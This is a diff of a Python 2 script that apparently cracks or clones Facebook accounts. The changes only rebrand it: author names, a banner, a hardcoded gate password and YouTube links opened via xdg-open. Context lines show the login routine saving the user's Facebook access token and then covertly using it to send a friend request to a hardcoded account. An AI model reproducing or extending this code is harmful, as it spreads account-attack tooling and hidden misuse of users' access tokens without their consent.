@@ -56,7 +56,7 @@ logo = """
 \033[1;96m         ____) | |_) |  __/  __/ (_| | |
 \033[1;96m        |_____/| .__/ \___|\___|\__,_|_|
 \033[1;96m               | |                      
-\033[1;96m               |_|   Aahil Updated 0.3                   
+\033[1;96m               |_|   Atiq Updated 0.3                   
 \033[1;91m       ♦♦♦———————————————————————————————♦♦♦
 """
 def tik():
@@ -76,13 +76,14 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
+__________ _____ _______ ____. ___ ___ _____ \______ \ / _ \ \ \ | |/ | \ / _ \ | _/ / /_\ \ / | \ | / ~ \/ /_\ \ | | \/ | \/ | \/\__| \ Y / | \ |____|_ /\____|__ /\____|__ /\________|\___|_ /\____|__ / \/ \/ \/ \/ \/ 
 
-\033[1;97m        ___    ___   _   _ _____ _     
-\033[1;92m       / _ \  / _ \ | | | |_   _| | Updated✔ 
-\033[1;97m      / /_\ \/ /_\ \| |_| | | | | |    
-\033[1;92m      |  _  ||  _  ||  _  | | | | |    
-\033[1;97m      | | | || | | || | | |_| |_| |____
-\033[1;97m      \_| |_/\_| |_/\_| |_/\___/\_____/
+ 
+
+
+  
+
+
                                                                
 
 """
@@ -100,12 +101,12 @@ jalan("\033[1;96m•◈• |_____/|_|    |______|______|_____/_____|")
 jalan("   \033[1;91m INDAIN USERZ USE ANY PROXY ")	
 jalan("   \033[1;91m WIFI USERZ USE ANY PROXY ")	
 
-jalan("   \033[1;93m Welcome to Aahil Creations ")
+jalan("   \033[1;93m Welcome to Atiq Creations ")
 
-jalan("\033[1;97m•◈•──────────•◈•\033[1;96mBlacktiger\033[1;96m•◈•──────────•◈•")
+jalan("\033[1;97m•◈•──────────•◈•\033[1;96mNAME MR RANJHA\033[1;96m•◈•──────────•◈•")
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "ranjha"
+CorrectPassword = "Ranjha"
 
 
 loop = 'true'
@@ -118,10 +119,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://www.youtube.com/channel/UCPjsRDBYr8KIR-3iMs00zmg')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://www.youtube.com/channel/UCPjsRDBYr8KIR-3iMs00zmg')
 
 def login():
 	os.system('clear')
@@ -165,7 +166,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.youtube.com/channel/UCPjsRDBYr8KIR-3iMs00zmg')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
